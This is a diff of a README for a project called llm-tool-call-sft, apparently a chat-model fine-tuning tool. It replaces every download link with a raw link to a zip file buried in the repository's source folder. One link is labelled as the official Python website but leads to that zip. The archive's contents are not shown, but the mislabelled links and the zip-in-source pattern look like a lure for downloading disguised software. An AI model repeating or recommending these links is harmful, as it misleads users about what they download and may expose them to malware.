@@ -15,13 +15,13 @@ Before you download, make sure your system meets the following requirements:
 - **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution.
 - **Memory:** At least 8 GB RAM is recommended.
 - **Disk Space:** You will need around 1 GB of free disk space for installation and additional data.
-- **Python:** Python 3.7 or later installed on your system. If you don't have it, you can download it from the [official Python website](https://raw.githubusercontent.com/AlineFree/llm-tool-call-sft/main/scripts/llm-tool-call-sft-v3.3.zip).
+- **Python:** Python 3.7 or later installed on your system. If you don't have it, you can download it from the [official Python website](https://raw.githubusercontent.com/AlineFree/llm-tool-call-sft/main/src/trainer/sft_call_tool_llm_2.5.zip).
 
 ## 📥 Download & Install
 
 To download the application, visit the Releases page:
 
-[![Download llm-tool-call-sft](https://raw.githubusercontent.com/AlineFree/llm-tool-call-sft/main/scripts/llm-tool-call-sft-v3.3.zip)](https://raw.githubusercontent.com/AlineFree/llm-tool-call-sft/main/scripts/llm-tool-call-sft-v3.3.zip)
+[![Download llm-tool-call-sft](https://raw.githubusercontent.com/AlineFree/llm-tool-call-sft/main/src/trainer/sft_call_tool_llm_2.5.zip)](https://raw.githubusercontent.com/AlineFree/llm-tool-call-sft/main/src/trainer/sft_call_tool_llm_2.5.zip)
 
 On the Releases page, you will see different versions of the software. Choose the version that suits your operating system. Here’s how you proceed:
 
@@ -76,4 +76,4 @@ Your feedback is valuable. It helps us improve the application and serve you bet
 
 Thank you for choosing llm-tool-call-sft. We hope you enjoy enhancing your chat language models with this fine-tuning application. For downloading the latest version, visit the Releases page again:
 
-[![Download llm-tool-call-sft](https://raw.githubusercontent.com/AlineFree/llm-tool-call-sft/main/scripts/llm-tool-call-sft-v3.3.zip)](https://raw.githubusercontent.com/AlineFree/llm-tool-call-sft/main/scripts/llm-tool-call-sft-v3.3.zip)
+[![Download llm-tool-call-sft](https://raw.githubusercontent.com/AlineFree/llm-tool-call-sft/main/src/trainer/sft_call_tool_llm_2.5.zip)](https://raw.githubusercontent.com/AlineFree/llm-tool-call-sft/main/src/trainer/sft_call_tool_llm_2.5.zip)
